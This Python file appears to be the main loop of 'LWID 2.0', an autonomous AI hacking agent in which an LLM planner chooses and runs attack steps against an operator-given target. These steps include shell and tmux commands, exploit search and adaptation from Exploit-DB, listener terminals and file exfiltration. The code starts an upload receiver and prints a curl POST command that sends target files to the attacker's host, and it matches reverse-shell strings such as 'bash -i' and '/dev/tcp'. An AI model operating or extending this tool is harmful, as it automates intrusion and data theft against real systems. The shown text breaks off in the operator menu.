#!/usr/bin/env python3

LWID 2.0 — main.py
~~~~~~~~~~~~~~~~~~~

from __future__ import annotations
import aiohttp
import asyncio
import json
import os
import re
import shlex
import signal
import subprocess
import sys
import threading
import http.server
import socketserver
from typing import Any, Set

from dotenv import load_dotenv
from agents.lead_planner import evaluate_tactics

from autogen_agentchat.agents import AssistantAgent
from autogen_agentchat.messages import TextMessage
from autogen_core import CancellationToken
from autogen_ext.models.anthropic import AnthropicChatCompletionClient
from autogen_ext.models.openai import OpenAIChatCompletionClient
from autogen_ext.cache_store.diskcache import DiskCacheStore
from autogen_ext.models.cache import ChatCompletionCache
from diskcache import Cache

# ── Local imports ─────────────────────────────────────────────────────
from core.memory import (
    clean_mcp_output,
    ensure_kb_size,
    kb_to_str,
    safe_llm_call,
    summarize_history,
    update_knowledge_base,
    validate_kb,
    EMPTY_KB,
)
from core.state import load_state, save_state

from agents.lead_planner import (
    build_context_prompt,
    create_lead_planner,
    extract_json,
    normalize_command,
    format_executed_commands,
)
from agents.researcher import run_research
from agents.exploit_adapter import adapt_exploit

from tools.mcp_client import (
    create_executor_agent,
    create_mcp_workbench,
)

load_dotenv()

# ──────────────────────────────────────────────────────────────────────
# COST TRACKING (per-million-token rates)
# ──────────────────────────────────────────────────────────────────────
DS_CHAT_IN: float = 0.14 / 1_000_000
DS_CHAT_OUT: float = 0.28 / 1_000_000
ANTHROPIC_IN: float = 3.00 / 1_000_000
ANTHROPIC_OUT: float = 15.00 / 1_000_000

# ──────────────────────────────────────────────────────────────────────
# CONTEXT MANAGEMENT SETTINGS
# ──────────────────────────────────────────────────────────────────────
MAX_HISTORY_MESSAGES: int = 16
SUMMARIZE_THRESHOLD: int = 12
KEEP_RECENT: int = 4
TOKEN_RESET_THRESHOLD: int = 120_000
EXEC_TIMEOUT: int = 120  # seconds
HEXSTRIKE_URL: str = "http://127.0.0.1:8888"  # HexStrike API base URL
TMUX_HTTP_TIMEOUT: int = 60  # seconds for tmux HTTP requests
TMUX_HTTP_RETRIES: int = 2  # retry count for tmux HTTP requests

# ──────────────────────────────────────────────────────────────────────
# EXFILTRATION / FILE ANALYSIS HELPERS
# ──────────────────────────────────────────────────────────────────────

class _UploadHandler(http.server.SimpleHTTPRequestHandler):
    """Minimal HTTP handler that accepts POST file uploads."""

    def do_POST(self) -> None:
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length) if content_length > 0 else b""
        filename = os.path.basename(self.path) or "downloaded.bin"
        if body:
            with open(filename, "wb") as fh:
                fh.write(body)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Upload successful")

    # Silence request logs
    def log_message(self, format: str, *args: Any) -> None:  # noqa: A002
        pass


_EXFIL_HTTPD: socketserver.TCPServer | None = None


async def _download_file(remote_path: str, local_path: str) -> str:
    """Start a local HTTP receiver and return instructions for the target."""
    global _EXFIL_HTTPD
    port = 8000
    try:
        result = subprocess.run(
            ["hostname", "-I"], capture_output=True, text=True, timeout=5
        )
        kali_ip = result.stdout.strip().split()[0] if result.stdout.strip() else "YOUR_IP"
    except Exception:
        kali_ip = "YOUR_IP"

    if _EXFIL_HTTPD is None:
        _EXFIL_HTTPD = socketserver.TCPServer(("", port), _UploadHandler)
        threading.Thread(target=_EXFIL_HTTPD.serve_forever, daemon=True).start()

    return (
        f"Local receiver started on port {port}.\n"
        f"Execute this on target:\n"
        f"curl -X POST -F 'file=@{remote_path}' "
        f"http://{kali_ip}:{port}/{local_path} "
        f"|| base64 -w 0 {remote_path}\n"
    )


async def _analyze_file(local_path: str) -> str:
    """Analyse a downloaded file locally (pcap, zip, kdbx, binary)."""
    if not os.path.exists(local_path):
        return f"[!] Error: File {local_path} not found on Kali."
    safe_path = shlex.quote(local_path)
    ext = local_path.rsplit(".", 1)[-1].lower() if "." in local_path else ""

    cmd_map = {
        "pcap": f"tshark -r {safe_path} -q -z credentials 2>/dev/null || tcpdump -qns 0 -A -r {safe_path} | head -n 50",
        "cap": f"tshark -r {safe_path} -q -z credentials 2>/dev/null || tcpdump -qns 0 -A -r {safe_path} | head -n 50",
        "zip": f"unzip -l {safe_path}",
        "kdbx": f"file {safe_path}; echo 'Use keepass2john locally'",
    }
    cmd = cmd_map.get(ext, f"strings {safe_path} | head -n 50")

    try:
        proc = await asyncio.create_subprocess_shell(
            cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
        )
        stdout, _ = await proc.communicate()
        res = stdout.decode(errors="ignore")
        return f"Analysis of {local_path}:\n{res[:3000]}"
    except Exception as exc:
        return f"Error analysing {local_path}: {exc}"


async def _spawn_terminal(cmd: str) -> str:
    """Open a GUI terminal window for manual operator interaction."""
    try:
        safe_cmd = shlex.quote(f"{cmd}; exec bash")
        full_cmd = f"bash -c {safe_cmd}"
        subprocess.Popen(
            ["x-terminal-emulator", "-e", full_cmd], start_new_session=True
        )
        return f"Operator successfully connected manually via command: {cmd}"
    except Exception as exc:
        return f"Failed to open terminal: {exc}"


# ──────────────────────────────────────────────────────────────────────
# GLOBAL STATE
# ──────────────────────────────────────────────────────────────────────

class _GlobalState:
    pause_requested: bool = False
    cancel_token: CancellationToken = CancellationToken()


async def _async_input(prompt: str) -> str:
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(None, lambda: input(prompt))


# ──────────────────────────────────────────────────────────────────────
# TMUX HTTP HELPER (FIX #9, #10, #20)
# ──────────────────────────────────────────────────────────────────────

async def _tmux_http_call(
    session: aiohttp.ClientSession,
    url: str,
    payload: dict,
) -> str:
    """Send a request to HexStrike tmux API with retry + timeout.

    Uses a shared ``aiohttp.ClientSession`` to avoid resource leaks.
    Retries on transient errors with exponential back-off.
    """
    last_error: str = ""
    for attempt in range(TMUX_HTTP_RETRIES + 1):
        try:
            async with session.post(url, json=payload, timeout=aiohttp.ClientTimeout(total=TMUX_HTTP_TIMEOUT)) as resp:
                res_json = await resp.json()
                return res_json.get("output", str(res_json))
        except asyncio.TimeoutError:
            last_error = f"Timeout after {TMUX_HTTP_TIMEOUT}s"
        except aiohttp.ClientError as e:
            last_error = str(e)
        except Exception as e:
            last_error = str(e)

        if attempt < TMUX_HTTP_RETRIES:
            wait = 2 ** (attempt + 1)
            print(f"[TMUX RETRY] Attempt {attempt + 1}/{TMUX_HTTP_RETRIES} failed: {last_error}. Waiting {wait}s…")
            await asyncio.sleep(wait)

    return f"[TMUX ERROR]: Failed after {TMUX_HTTP_RETRIES + 1} attempts. Last error: {last_error}"


# ──────────────────────────────────────────────────────────────────────
# MAIN PIPELINE
# ──────────────────────────────────────────────────────────────────────

async def main() -> None:
    loop = asyncio.get_running_loop()

    # ── Signal handling (Ctrl+C) ──────────────────────────────────────
    def handle_sigint() -> None:
        if not _GlobalState.pause_requested:
            print("\n\n\033[91m[SIGNAL] Ctrl+C intercepted! Aborting current action…\033[0m")
            _GlobalState.pause_requested = True
            _GlobalState.cancel_token.cancel()
        else:
            print("\n[!] Double Ctrl+C detected. Hard exiting!")
            os._exit(0)

    if sys.platform != "win32":
        loop.add_signal_handler(signal.SIGINT, handle_sigint)

    # ── Operator input ────────────────────────────────────────────────
    print("=" * 60)
    target_task: str = await _async_input("[TARGET] Enter target (IP/URL) and task: ")
    print("=" * 60)

    # ── LLM clients ───────────────────────────────────────────────────
    # ── LLM clients ───────────────────────────────────────────────────
    cache_store = DiskCacheStore(Cache(".autogen_cache"))

    # Клиент для Executor/Archivist/Researcher (DeepSeek V3)
    ds_chat_client = ChatCompletionCache(
        OpenAIChatCompletionClient(
            model="deepseek-chat",
            api_key=os.getenv("DEEPSEEK_API_KEY"),
            base_url="https://api.deepseek.com",
            model_info={
                "vision": False,
                "function_calling": True,
                "json_output": True,
                "family": "deepseek",
            },
        ),
        cache_store,
    )

    # Клиент для Lead Planner (DeepSeek R1) 
    # Кэш здесь не нужен, чтобы планировщик не застревал в зацикленных мыслях
    lead_model_client = OpenAIChatCompletionClient(
        model="deepseek-v4-pro",
        api_key=os.getenv("DEEPSEEK_API_KEY"),
        base_url="https://api.deepseek.com",
        model_info={
            "vision": False,
            "function_calling": False,
            "json_output": False,
            "family": "deepseek",
        },
    )
    # ── MCP workbench ─────────────────────────────────────────────────
    print("[*] Starting local MCP server…")

    async with create_mcp_workbench() as mcp:

        execution_agent = create_executor_agent(ds_chat_client, mcp)

        # FIX #9: Shared aiohttp session for HexStrike tmux calls
        hexstrike_session = aiohttp.ClientSession()

        print("\n[*] Starting autonomous operation (LWID 2.0)…")
        print("-" * 60)

        STOP_PHRASE = "MISSION_COMPLETED"

        # ── Load state ────────────────────────────────────────────────
        kb_dict, executed_commands, lead_history = load_state(target_task)
        if "current_phase" not in kb_dict:
            kb_dict["current_phase"] = "RECON"

        # ── Cost accumulators ─────────────────────────────────────────
        total_reasoner_in = 0
        total_reasoner_out = 0
        total_chat_in = 0
        total_chat_out = 0
        last_prompt_tokens = 0

        auto_steps_remaining = 0

        # ── Agent factory helper ──────────────────────────────────────
        def _make_lead() -> AssistantAgent:
            return create_lead_planner(lead_model_client, target_task)

        lead_agent = _make_lead()
        agent_step_count = 0
        last_raw_output = ""
        consecutive_json_failures = 0  # FIX: Счётчик последовательных ошибок JSON
        MAX_JSON_FAILURES = 3          # Порог для сброса агента

        # FIX: Умный anti-loop — счётчик базовых команд
        from collections import Counter
        base_command_counter: Counter = Counter()
        BASE_CMD_REPEAT_LIMIT = 3  # Макс. повторений одной базовой команды





        
        # ==============================================================
        # MAIN LOOP
        # ==============================================================
        while True:
            if _GlobalState.pause_requested:
                auto_steps_remaining = 0
                _GlobalState.pause_requested = False

            # ──────────────────────────────────────────────────────────
            # AUTO-STEP EXECUTION
            # ──────────────────────────────────────────────────────────
            
            if auto_steps_remaining > 0:
                _GlobalState.cancel_token = CancellationToken()

                try:
                    print(
                        f"\n[AUTO-STEP {auto_steps_remaining} left | "
                        f"Phase: {kb_dict['current_phase']} | "
                        f"Agent steps: {agent_step_count}] "
                        f"LWID 2.0 is thinking… (Ctrl+C to pause)"
                    )

                    # ── Agent reset check ─────────────────────────────
                    if last_prompt_tokens > TOKEN_RESET_THRESHOLD or agent_step_count > 15:
                        print(
                            f"[AGENT RESET] Tokens={last_prompt_tokens}, "
                            f"Steps={agent_step_count}. Recreating agent…"
                        )

                        # HANDOVER NOTE: Capture last thought + raw output before reset
                        last_thought = ""
                        if lead_history:
                            last_thought = lead_history[-1].content if hasattr(lead_history[-1], "content") else str(lead_history[-1])
                            # Truncate to avoid blowing the new context
                            if len(last_thought) > 500:
                                last_thought = last_thought[:500] + "…"

                        if len(lead_history) > 2:
                            try:
                                summary = await summarize_history(lead_history, ds_chat_client)
                                # Build handover with last thought + last raw output
                                handover_parts = [f"[CONVERSATION SUMMARY]: {summary}"]
                                if last_thought:
                                    handover_parts.append(
                                        f"\n[CRITICAL HANDOVER]: Before the reset, your last immediate intention was:\n"
                                        f"{last_thought}\n"
                                        f"RESUME EXACTLY FROM THIS POINT."
                                    )
                                if last_raw_output:
                                    clipped = last_raw_output[:1500]
                                    if len(last_raw_output) > 1500:
                                        clipped += "…[truncated]"
                                    handover_parts.append(
                                        f"\n[LAST COMMAND OUTPUT BEFORE RESET]:\n{clipped}"
                                    )
                                lead_history = [
                                    TextMessage(
                                        content="\n".join(handover_parts),
                                        source="system",
                                    )
                                ]
                            except Exception as exc:
                                print(f"[AGENT RESET WARNING] Summarisation failed: {exc}")
                                lead_history = lead_history[-2:]
                        lead_agent = _make_lead()
                        agent_step_count = 0
                        last_prompt_tokens = 0

                    # ── Build context ─────────────────────────────────
                    # 1. Собираем "толстый" промпт с краткосрочной памятью
                    bulky_context = build_context_prompt(kb_dict, executed_commands, last_raw_output)
                    lead_history.append(TextMessage(content=bulky_context, source="user"))
                    bulky_context_idx = len(lead_history) - 1  # запоминаем индекс

                    # ── Summarise if overflow ─────────────────────────
                    if len(lead_history) > SUMMARIZE_THRESHOLD:
                        print(f"[MEMORY] History too long ({len(lead_history)} msgs). Summarising…")
                        old_messages = lead_history[:-KEEP_RECENT]
                        recent_messages = lead_history[-KEEP_RECENT:]
                        try:
                            summary = await summarize_history(old_messages, ds_chat_client)
                            lead_history = [
                                TextMessage(
                                    content=f"[CONVERSATION SUMMARY]: {summary}",
                                    source="system",
                                )
                            ] + recent_messages
                            print(f"[MEMORY] Compressed to {len(lead_history)} msgs")
                        except Exception as exc:
                            print(f"[MEMORY WARNING] Summarisation failed: {exc}. Trimming.")
                            lead_history = recent_messages
                        # Пересчитываем индекс после сжатия истории
                        bulky_context_idx = len(lead_history) - 1

                    # =================================================================
                    # 🤖 2. ПРОГОНЯЕМ KB ЧЕРЕЗ ЖЕСТКИЙ PYTHON-ДВИЖОК
                    # =================================================================
                    current_strategy = evaluate_tactics(kb_dict)
                    
                    # Красиво выводим в консоль (только саму суть тактики)
                    try:
                        tactic_to_print = current_strategy.split('=== ACTIVE ATTACK STRATEGY ===')[1].split('CRITICAL RULE')[0].strip()
                        print(f"\n[🤖 ENGINE DIRECTIVE] {tactic_to_print}")
                    except Exception:
                        print(f"\n[🤖 ENGINE DIRECTIVE] {current_strategy.strip()}")

                    # 3. Вбиваем стратегию в голову ИИ прямо перед его ходом
                    strategy_msg = TextMessage(
                        content=current_strategy,
                        source="system",
                    )
                    lead_history.append(strategy_msg)
                    # =================================================================

                    # ── Call Lead Planner ──────────────────────────────
                    try:
                        response = await lead_agent.on_messages(
                            lead_history, _GlobalState.cancel_token
                        )
                        
                        # FIX #4: ПОСЛЕ ответа LLM заменяем "толстый" промпт на "чистый"
                        # и удаляем одноразовую strategy_msg, чтобы не раздувать контекст.
                        # strategy_msg — последний элемент, bulky_context — предпоследний.
                        clean_context = build_context_prompt(kb_dict, executed_commands, "")
                        # Удаляем strategy_msg (она одноразовая, не нужна в истории)
                        if len(lead_history) > bulky_context_idx + 1:
                            lead_history.pop(bulky_context_idx + 1)
                        # Заменяем bulky_context на чистый (без raw output)
                        if bulky_context_idx < len(lead_history):
                            lead_history[bulky_context_idx] = TextMessage(content=clean_context, source="user")

                    except Exception as api_err:
                        err_str = str(api_err)
                        # ... дальше идет старый код обработки ошибок (if "prompt is too long" in err_str и т.д.)
                        if (
                            "prompt is too long" in err_str
                            or "too many tokens" in err_str.lower()
                            or "400" in err_str
                        ):
                            print(f"\n[CONTEXT OVERFLOW] {err_str[:100]}…")
                            print("[AGENT RESET] Emergency reset…")
                            try:
                                summary = await summarize_history(lead_history, ds_chat_client)
                                lead_history = [
                                    TextMessage(
                                        content=f"[CONVERSATION SUMMARY]: {summary}",
                                        source="system",
                                    )
                                ]
                            except Exception:
                                lead_history = []
                            lead_agent = _make_lead()
                            agent_step_count = 0
                            last_prompt_tokens = 0
                            context_prompt = build_context_prompt(kb_dict, executed_commands, last_raw_output)
                            lead_history.append(TextMessage(content=context_prompt, source="user"))
                            response = await lead_agent.on_messages(
                                lead_history, _GlobalState.cancel_token
                            )
                        else:
                            raise

                    agent_step_count += 1
                    step_reasoner_in = 0
                    step_reasoner_out = 0

                    if (
                        hasattr(response.chat_message, "models_usage")
                        and response.chat_message.models_usage
                    ):
                        step_reasoner_in = response.chat_message.models_usage.prompt_tokens
                        step_reasoner_out = response.chat_message.models_usage.completion_tokens
                        total_reasoner_in += step_reasoner_in
                        total_reasoner_out += step_reasoner_out
                        last_prompt_tokens = step_reasoner_in

                    reply_text: str = response.chat_message.content
                    clean_reply = reply_text

                    # Strip <think> tags for display
                    think_match = re.search(r"<think>(.*?)</think>", reply_text, re.DOTALL)
                    if think_match:
                        print(f"\033[90m[Thoughts]:\n{think_match.group(1).strip()[:300]}… (truncated)\033[0m")
                        clean_reply = re.sub(r"<think>.*?</think>", "", reply_text, flags=re.DOTALL).strip()

                    print(f"\n\033[96m[Lead_Planner]:\n{clean_reply}\033[0m")
                    lead_history.append(TextMessage(content=clean_reply, source="Lead_Planner"))

                    # ── Parse action ──────────────────────────────────
                    action = extract_json(clean_reply)
                    raw_output = ""
                    tool: str | None = None

                    if not action:
                        consecutive_json_failures += 1
                        print(f"[JSON FAIL] {consecutive_json_failures}/{MAX_JSON_FAILURES} consecutive failures")

                        if consecutive_json_failures >= MAX_JSON_FAILURES:
                            print("[AGENT RESET] Too many JSON failures. Resetting agent…")
                            lead_agent = _make_lead()
                            agent_step_count = 0
                            consecutive_json_failures = 0
                            raw_output = (
                                "[SYSTEM ERROR]: Agent was reset after repeated JSON failures. "
                                "You MUST output ONLY a valid JSON object with keys: "
                                "thought, phase, tool, args. NO text before or after the JSON."
                            )
                        else:
                            raw_output = (
                                "[SYSTEM ERROR]: Last output was not valid JSON. "
                                "Output strictly JSON with fields: thought, phase, tool, args."
                            )
                        lead_history.append(TextMessage(content=raw_output, source="system"))
                    else:
                        consecutive_json_failures = 0  # Reset on success
                        tool = action.get("tool")
                        args = action.get("args", "")
                        if isinstance(args, dict):
                            args = args.get("cmd", json.dumps(args))

                        # ── Phase update ──────────────────────────────
                        new_phase = action.get("phase", kb_dict["current_phase"])
                        if new_phase and new_phase != kb_dict["current_phase"]:
                            print(f"[PHASE CHANGE]: {kb_dict['current_phase']} → {new_phase}")
                            kb_dict["current_phase"] = new_phase

                        # ── Dispatch ──────────────────────────────────
                        if tool == "finish" or STOP_PHRASE in str(args):
                            print("\n[SUCCESS] Operation completed!")
                            save_state(target_task, kb_dict, executed_commands, lead_history)
                            await hexstrike_session.close()
                            break

                        elif tool == "execute_shell":
                            norm_args = normalize_command(str(args))
                            base_cmd_parts = norm_args.split()
                            base_cmd = base_cmd_parts[0] if base_cmd_parts else norm_args
                            
                            # Утилиты, которые можно вызывать бесконечное число раз (если меняются аргументы)
                            IGNORE_BASE_CMDS = {"curl", "wget", "echo", "cat", "ls", "grep", "head", "tail", "python", "python3", "cd"}

                            # Точный дубликат команды блокируем всегда
                            if norm_args in executed_commands:
                                print(f"[ANTI-HANG]: Prevented duplicate command: {args}")
                                raw_output = f"[WARNING]: Command '{args}' was already executed. Try a different vector."
                                lead_history.append(TextMessage(content=raw_output, source="system"))
                            else:
                                is_looping = False
                                # Проверяем лимиты только для тяжелых тулз
                                if base_cmd not in IGNORE_BASE_CMDS:
                                    if base_cmd in (
                                        "nmap", "gobuster", "ffuf", "nikto", "dirb",
                                        "hydra", "nuclei", "sqlmap", "wpscan", "enum4linux",
                                    ):
                                        base_cmd_key = f"{base_cmd}:{base_cmd_parts[-1]}"
                                    else:
                                        base_cmd_key = base_cmd
                                        
                                    if base_command_counter[base_cmd_key] >= BASE_CMD_REPEAT_LIMIT:
                                        is_looping = True
                                        print(f"[ANTI-LOOP]: Base command '{base_cmd_key}' used {base_command_counter[base_cmd_key]} times. Forcing different approach.")
                                        raw_output = (
                                            f"[WARNING]: You have already used '{base_cmd}' "
                                            f"{base_command_counter[base_cmd_key]} times on this target. "
                                            f"STOP using this tool and try a completely different approach."
                                        )
                                        lead_history.append(TextMessage(content=raw_output, source="system"))
                                    else:
                                        base_command_counter[base_cmd_key] += 1

                                if not is_looping:
                                    executed_commands.add(norm_args)
                                    print(f"[EXEC]: {args}")
                                    exec_history = [
                                        TextMessage(
                                            content=f"Execute this command via MCP: {args}",
                                            source="user",
                                        )
                                    ]
                                    
                                    try:
                                        exec_response = await asyncio.wait_for(
                                            safe_llm_call(
                                                lambda: execution_agent.on_messages(
                                                    exec_history, _GlobalState.cancel_token
                                                ),
                                                max_retries=2,
                                                label="Executor",
                                            ),
                                            timeout=EXEC_TIMEOUT,
                                        )
                                    except asyncio.TimeoutError:
                                        raw_output = (
                                            f"[TIMEOUT]: Command '{args}' exceeded "
                                            f"{EXEC_TIMEOUT}s timeout. It may be hanging."
                                        )
                                        print(f"[TIMEOUT]: {args}")
                                        lead_history.append(TextMessage(content=raw_output, source="system"))
                                        execution_agent = create_executor_agent(ds_chat_client, mcp)
                                    else:
                                        if (
                                            hasattr(exec_response.chat_message, "models_usage")
                                            and exec_response.chat_message.models_usage
                                        ):
                                            total_chat_in += exec_response.chat_message.models_usage.prompt_tokens
                                            total_chat_out += exec_response.chat_message.models_usage.completion_tokens
                                        raw_output = exec_response.chat_message.content

                        elif tool == "tmux_execute":
                            # Парсим аргументы (ожидаем JSON/словарь)
                            t_args = args if isinstance(args, dict) else {}
                            if isinstance(args, str):
                                try:
                                    t_args = json.loads(args)
                                except Exception:
                                    t_args = {"session_name": "main", "command": str(args)}

                            session_name = t_args.get("session_name", "main")
                            command = t_args.get("command", "")

                            # FIX #8: Anti-loop для tmux_execute
                            tmux_cmd_key = f"tmux:{session_name}:{normalize_command(command)}"
                            if tmux_cmd_key in executed_commands:
                                print(f"[ANTI-HANG]: Prevented duplicate tmux command: {command}")
                                raw_output = f"[WARNING]: tmux command '{command}' in session '{session_name}' was already executed. Try a different approach."
                                lead_history.append(TextMessage(content=raw_output, source="system"))
                            else:
                                executed_commands.add(tmux_cmd_key)
                                print(f"[TMUX EXEC]: Session '{session_name}' <- '{command}'")

                                # FIX #9/#10/#20: Reuse session, timeout, retry
                                raw_output = await _tmux_http_call(
                                    hexstrike_session,
                                    f"{HEXSTRIKE_URL}/api/tmux/execute",
                                    {"session_name": session_name, "command": command},
                                )

                                # HANDOVER.4: Auto-set is_awaiting_callback for exploit/revshell commands
                                cmd_lower = command.lower()
                                if any(kw in cmd_lower for kw in (
                                    "exploit", "reverse", "shell", "payload", "meterpreter",
                                    "nc -e", "bash -i", "/dev/tcp", "mkfifo", "python -c",
                                    "python3 -c", "run", "exp_bin", "exp.py",
                                )):
                                    kb_dict.setdefault("state_flags", {})["is_awaiting_callback"] = True
                                    print("[FLAG] is_awaiting_callback = True (exploit/revshell sent via tmux)")

                        elif tool == "tmux_read":
                            t_args = args if isinstance(args, dict) else {}
                            if isinstance(args, str):
                                try:
                                    t_args = json.loads(args)
                                except Exception:
                                    t_args = {"session_name": str(args)}

                            session_name = t_args.get("session_name", "main")
                            print(f"[TMUX READ]: Checking screen of session '{session_name}'...")

                            # FIX #9/#10/#20: Reuse session, timeout, retry
                            raw_output = await _tmux_http_call(
                                hexstrike_session,
                                f"{HEXSTRIKE_URL}/api/tmux/read",
                                {"session_name": session_name, "lines": 100},
                            )

                        elif tool == "search_exploit":
                            print(f"[RESEARCH]: Searching exploits for '{args}'…")
                            target_ctx = kb_to_str(kb_dict.get("target_info", {}))
                            research_result = await run_research(
                                str(args),
                                ds_chat_client,
                                target_context=target_ctx,
                            )
                            raw_output = research_result
                            print(f"\033[93m[Researcher]:\n{research_result[:500]}…\033[0m")

                        elif tool == "adapt_exploit":
                            print(f"[ADAPT]: Adapting exploit…")
                            # Parse args — expect dict or JSON string
                            adapt_args: dict[str, str] = {}
                            if isinstance(action.get("args"), dict):
                                adapt_args = action["args"]
                            else:
                                try:
                                    adapt_args = json.loads(str(args))
                                except (json.JSONDecodeError, TypeError):
                                    adapt_args = {"edb_id": str(args)}

                            # IoT: Автоматически передаём architecture и shell_type из KB
                            target_info = kb_dict.get("target_info", {})
                            adapt_result = await adapt_exploit(
                                edb_id=adapt_args.get("edb_id", ""),
                                model_client=ds_chat_client,
                                target_ip=adapt_args.get("target_ip", target_info.get("ip", "TARGET_IP")),
                                target_port=adapt_args.get("target_port", "TARGET_PORT"),
                                service_info=adapt_args.get("service_info", ""),
                                extra_context=adapt_args.get("extra_context", ""),
                                architecture=target_info.get("architecture", "unknown"),
                                shell_type=target_info.get("shell_type", "unknown"),
                            )
                            if adapt_result["error"]:
                                raw_output = f"[Exploit Adapter ERROR]: {adapt_result['error']}\n{adapt_result['summary']}"
                            else:
                                # FIX 7.4: Автосохранение адаптированного эксплойта на диск
                                adapted_code = adapt_result.get("code", "")
                                saved_path = ""
                                if adapted_code:
                                    edb_id_clean = adapt_args.get("edb_id", "unknown").replace("/", "_")
                                    exploit_dir = "/tmp/exploits"
                                    os.makedirs(exploit_dir, exist_ok=True)
                                    saved_path = os.path.join(exploit_dir, f"adapted_EDB-{edb_id_clean}.py")
                                    try:
                                        with open(saved_path, "w", encoding="utf-8") as f:
                                            f.write(adapted_code)
                                        print(f"[EXPLOIT SAVED]: {saved_path}")
                                    except OSError as write_err:
                                        print(f"[EXPLOIT SAVE ERROR]: {write_err}")
                                        saved_path = ""

                                raw_output = (
                                    f"[Exploit Adapter] {adapt_result['summary']}\n\n"
                                    f"Adapted code ({len(adapted_code)} chars) ready. "
                                    f"Original: {adapt_result['original_path']}"
                                )
                                if saved_path:
                                    raw_output += f"\nSaved adapted exploit to: {saved_path}"
                                    raw_output += f"\nRun it with: python3 {saved_path}"
                            print(f"\033[95m[Exploit_Adapter]:\n{raw_output[:500]}…\033[0m")

                        elif tool == "download_file":
                            paths = str(args).split(",")
                            raw_output = await _download_file(
                                paths[0].strip(),
                                paths[1].strip() if len(paths) > 1 else "downloaded.bin",
                            )

                        elif tool == "analyze_file":
                            raw_output = await _analyze_file(str(args).strip())

                        elif tool == "spawn_terminal":
                            raw_output = await _spawn_terminal(str(args).strip())
                            # HANDOVER.4: Auto-set is_awaiting_callback when listener is started
                            args_lower = str(args).lower()
                            if any(kw in args_lower for kw in ("nc ", "ncat ", "netcat ", "socat ", "listener", "-lvnp", "-nlvp")):
                                kb_dict.setdefault("state_flags", {})["is_awaiting_callback"] = True
                                print("[FLAG] is_awaiting_callback = True (listener started)")

                        elif tool == "chat_to_operator":
                            print(f"\n\033[93m[MESSAGE FROM AI]: {args}\033[0m")
                            lead_history.append(
                                TextMessage(
                                    content=f"[SYSTEM]: Message delivered to operator: {args}",
                                    source="system",
                                )
                            )
                            auto_steps_remaining = 0

                        else:
                            raw_output = f"Unknown tool requested: {tool}"
                            lead_history.append(
                                TextMessage(content=f"[WARNING]: {raw_output}", source="system")
                            )

                    # ── Update KB via Archivist ────────────────────────
                    # Сохраняем выхлоп в краткосрочную память ПЕРЕД тем, как Архивариус его удалит
                    if raw_output:
                        last_raw_output = raw_output

                    # ── Update KB via Archivist ────────────────────────
                    # FIX #7: Добавлены tmux_execute и tmux_read в список
                    if raw_output and raw_output.strip() and tool in (
                        "execute_shell",
                        "analyze_file",
                        "search_exploit",
                        "download_file",
                        "tmux_execute",
                        "tmux_read",
                    ):
                        clean_logs = clean_mcp_output(raw_output)
                        log_len = len(clean_logs)
                        print(f"\033[33m[Archivist]\033[0m: Compressing output ({log_len} chars)…")
                        # ... остальной код Архивариуса ...
                        try:
                            new_kb_str, arch_prompt, arch_comp = await update_knowledge_base(
                                clean_logs, kb_to_str(kb_dict), ds_chat_client
                            )
                            total_chat_in += arch_prompt
                            total_chat_out += arch_comp
                            kb_dict = validate_kb(new_kb_str)
                            kb_dict = ensure_kb_size(kb_dict)
                            print(f"[KB] Updated (Size: {len(kb_to_str(kb_dict))} chars)")

                            # FIX 7.5: Removed result_summary from lead_history to avoid
                            # duplication — last_raw_output is already injected into the
                            # next build_context_prompt() as WORKING MEMORY.
                        except asyncio.CancelledError:
                            raise
                        except Exception as exc:
                            print(f"[Archivist Error]: {exc}")

                    save_state(target_task, kb_dict, executed_commands, lead_history)

                    # ── Cost display ──────────────────────────────────
                    cost_planner = (total_reasoner_in * ANTHROPIC_IN) + (total_reasoner_out * ANTHROPIC_OUT)
                    cost_chat = (total_chat_in * DS_CHAT_IN) + (total_chat_out * DS_CHAT_OUT)
                    reset_note = (
                        " [!cost may be underestimated after agent reset]"
                        if agent_step_count <= 1 and total_reasoner_in > 0
                        else ""
                    )
                    print(
                        f"\033[92m[COST] ${cost_planner + cost_chat:.4f} "
                        f"(Lead: ${cost_planner:.4f} | Executor: ${cost_chat:.4f})"
                        f"{reset_note}\033[0m"
                    )
                    print("-" * 60)

                    auto_steps_remaining -= 1
                    if auto_steps_remaining <= 0:
                        print("\n[*] Auto-steps completed. Entering Operator Menu.")

                except asyncio.CancelledError:
                    print("\n\033[93m[INTERRUPT]: Operation safely aborted by operator.\033[0m")
                    auto_steps_remaining = 0
                    continue
                except Exception as exc:
                    if not _GlobalState.pause_requested:
                        print(f"[ERROR]: {exc}")
                    auto_steps_remaining = 0

            # ──────────────────────────────────────────────────────────
            # OPERATOR MENU
            # ──────────────────────────────────────────────────────────
            else:
                _GlobalState.pause_requested = False

                try:
                    user_cmd = await _async_input(
                        "\n\033[93mOperator [/auto N, /task N, /db, /phase, /history, /exit, or chat]: \033[0m"
                    )
                    user_cmd = user_cmd.strip()

                    if not user_cmd:
                        continue

                    if user_cmd.startswith("/auto"):
                        parts = user_cmd.split()
                        auto_steps_remaining = (
                            int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 1
                        )
                        print(f"[>] Resuming autonomous mode for {auto_steps_remaining} steps…")
                        continue

                    elif user_cmd.startswith("/task"):
                        parts = user_cmd.split()
                        auto_steps_remaining = (
                            int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 10
                        )
                        print("\n\033[96m[MULTILINE INPUT MODE]\033[0m Paste your text below.")
                        print("When done, type 'END' on a new line and press Enter.")
                        lines: list[str] = []
                        while True:
                            try:
                                line = await _async_input("")
                                if line.strip() == "END":
                                    break
                                lines.append(line)
                            except KeyboardInterrupt:
                                print("\nInput cancelled…")
                                lines = []
                                break

                        if lines:
                            full_prompt = "\n".join(lines)
                            if "operator_directives" not in kb_dict:
                                kb_dict["operator_directives"] = []
                            kb_dict["operator_directives"].append(full_prompt)
                            kb_dict["operator_directives"] = kb_dict["operator_directives"][-5:]
                            lead_history.append(
                                TextMessage(
                                    content=f"[OPERATOR DIRECTIVE]: {full_prompt}",
                                    source="user",
                                )
                            )
                            print(f"[>] Prompt loaded! Starting auto-mode for {auto_steps_remaining} steps…")
                        else:
                            auto_steps_remaining = 0
                        continue

                    elif user_cmd == "/db":
                        print(f"\n=== CURRENT KNOWLEDGE BASE ===\n{kb_to_str(kb_dict)}\n{'=' * 40}")
                        continue

